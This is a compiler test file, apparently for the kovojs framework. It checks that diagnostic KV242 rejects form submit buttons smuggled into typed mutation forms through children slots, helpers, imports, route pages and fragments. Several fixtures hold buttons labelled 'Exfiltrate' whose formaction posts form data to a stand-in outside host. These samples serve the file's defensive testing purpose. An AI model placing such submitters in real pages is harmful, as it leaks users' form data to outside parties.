import { describe, expect, it } from 'vitest';

import { compileComponentModule } from './index.js';

interface ExtraFile {
  readonly fileName: string;
  readonly source: string;
}

function compile(source: string, extraFiles: readonly ExtraFile[] = []) {
  return compileComponentModule({
    extraFiles,
    fileName: 'src/browser-final-rereview.tsx',
    source,
  } as Parameters<typeof compileComponentModule>[0] & {
    extraFiles: readonly ExtraFile[];
  });
}

function kv242(source: string, extraFiles: readonly ExtraFile[] = []) {
  return compile(source, extraFiles).diagnostics.filter(
    (diagnostic) => diagnostic.code === 'KV242',
  );
}

const optionalMutation = `
export const save = mutation({
  input: s.object({ email: s.string().optional() }),
  handler() { return null; },
});
`;

describe('browser/compiler final rereview: indirect mutation-form output', () => {
  it('rejects a submitter projected through a typed form component children slot', () => {
    // SPEC §§5.2, 6.3, and 9.1: component composition cannot move a submitter override into a
    // compiler-owned mutation form after the transport proof has classified it as a sibling.
    expect(
      kv242(`
${optionalMutation}
function MutationShell({ children }) {
  return <form id="account-save" mutation={save}>{children}</form>;
}
export const View = component({
  render: () => (
    <MutationShell>
      <button external formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>
    </MutationShell>
  ),
});
`),
    ).not.toEqual([]);
  });

  it('rejects a helper-returned submitter interpolated directly into a typed form', () => {
    expect(
      kv242(`
${optionalMutation}
function unsafeSubmitter() {
  return <button external formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>;
}
export const View = component({
  render: () => <form mutation={save}>{unsafeSubmitter()}</form>,
});
`),
    ).not.toEqual([]);
  });

  it('rejects an imported helper-returned submitter interpolated into a typed form', () => {
    expect(
      kv242(
        `
import { unsafeSubmitter } from './unsafe-submitter';
${optionalMutation}
export const View = component({
  render: () => <form mutation={save}>{unsafeSubmitter()}</form>,
});
`,
        [
          {
            fileName: 'src/unsafe-submitter.tsx',
            source: `export function unsafeSubmitter() {
  return <button external formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>;
}`,
          },
        ],
      ),
    ).not.toEqual([]);
  });

  it('rejects cross-component form association assembled by a route page root', () => {
    // Route page callbacks are document-render roots too; limiting the census to component(...)
    // declarations leaves a route-only assembly unit unable to relate its imported siblings.
    expect(
      kv242(
        `
import { route } from '@kovojs/server';
import { TypedForm } from './typed-form';
import { ExternalSubmitter } from './external-submitter';
export const account = route('/account', {
  page: () => <><TypedForm /><ExternalSubmitter /></>,
});
`,
        [
          {
            fileName: 'src/typed-form.tsx',
            source: `${optionalMutation}
export function TypedForm() {
  return <form id="account-save" mutation={save}><button>Save</button></form>;
}`,
          },
          {
            fileName: 'src/external-submitter.tsx',
            source: `export function ExternalSubmitter() {
  return <button external form="account-save" formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>;
}`,
          },
        ],
      ),
    ).not.toEqual([]);
  });

  it('rejects opaque JSX-valued output wrapped in an otherwise closed fragment', () => {
    expect(
      kv242(`
${optionalMutation}
function Project({ value }) { return <>{value}</>; }
function unsafeSubmitter() {
  return <button external form="account-save" formaction="https://outside.example/collect" formmethod="post">Exfiltrate</button>;
}
export const View = component({
  render: () => <>
    <form id="account-save" mutation={save}><button>Save</button></form>
    <Project value={unsafeSubmitter()} />
  </>,
});
`),
    ).not.toEqual([]);
  });

  it('rejects runtime-multipliable fields whose source has only one JSX control node', () => {
    expect(
      kv242(`
export const save = mutation({
  input: s.object({ email: s.string() }),
  handler() { return null; },
});
export const View = component({
  render: ({ emails }) => (
    <form mutation={save}>
      {emails.map((email) => <input name="email" value={email} />)}
    </form>
  ),
});
`),
    ).not.toEqual([]);
  });

  it('keeps a literal child in a statically separate native form valid', () => {
    expect(
      kv242(`
${optionalMutation}
function NativeShell({ children }) {
  return <form id="preview" action="/preview" method="get">{children}</form>;
}
export const View = component({
  render: () => <>
    <form mutation={save}><button>Save</button></form>
    <NativeShell><button formaction="/preview/compact" formmethod="get">Preview</button></NativeShell>
  </>,
});
`),
    ).toEqual([]);
  });
});
